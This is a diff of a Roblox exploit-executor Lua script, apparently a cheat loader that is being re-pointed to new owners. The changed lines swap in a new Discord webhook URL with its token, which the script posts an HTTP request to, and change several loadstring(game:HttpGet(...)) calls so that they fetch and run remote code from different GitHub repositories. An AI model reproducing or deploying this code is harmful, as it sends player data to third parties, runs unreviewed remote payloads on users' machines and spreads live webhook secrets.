@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-Webhook_URL =  "https://discord.com/api/webhooks/1225843632352002099/1qBa8Kb582Fe5HylOPhEJEfbXPWLlhCklbIjftslVMb1E8Ojy52Hzw1qgzAsRzQEWd-G"
+Webhook_URL =  "https://discord.com/api/webhooks/1260054056626556940/WS-90jwx1wWuXHJUBbF_rjnRlEBHyc0NwhNBsAunNeIp3zdqBbks-UWe8AdJXdjfMn5J"
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 httprequest(
 {
@@ -44,7 +44,7 @@ Body = HttpService:JSONEncode({
 }}
 })
 })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Function-FindFirstChild-Plr/main/blacklist"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DuyM7/Function-FindFirstChild-Plr/main/blacklist"))()
 local Anh_Gai_Alimi = {"rbxassetid://6942501524","rbxassetid://7903531742","rbxassetid://7903522083","rbxassetid://6409799523","rbxassetid://8881175113",
                 "rbxassetid://7584008919","rbxassetid://6271530098","rbxassetid://7388383866","rbxassetid://7962732035","rbxassetid://6842416695","rbxassetid://6576447146",
                 "rbxassetid://10171317457","rbxassetid://10171317457","rbxassetid://8598068647","rbxassetid://8192162908","rbxassetid://8677814109","rbxassetid://4597457883"
@@ -83,9 +83,9 @@ add.Parent = workspace
 add.Name = "Testh"
 if game.PlaceId==4587545091 then
 print("First Sea")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerty-4/1p/main/1bth"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DuyM7/Viet-Nam-Piece1/main/KhanhNgoc"))()
 elseif
 game.PlaceId==7258239416 then
 print("Second Sea")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerty-4/1p/main/2bth"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DuyM7/Viet-Nam-Piece1/main/duy"))()
 end
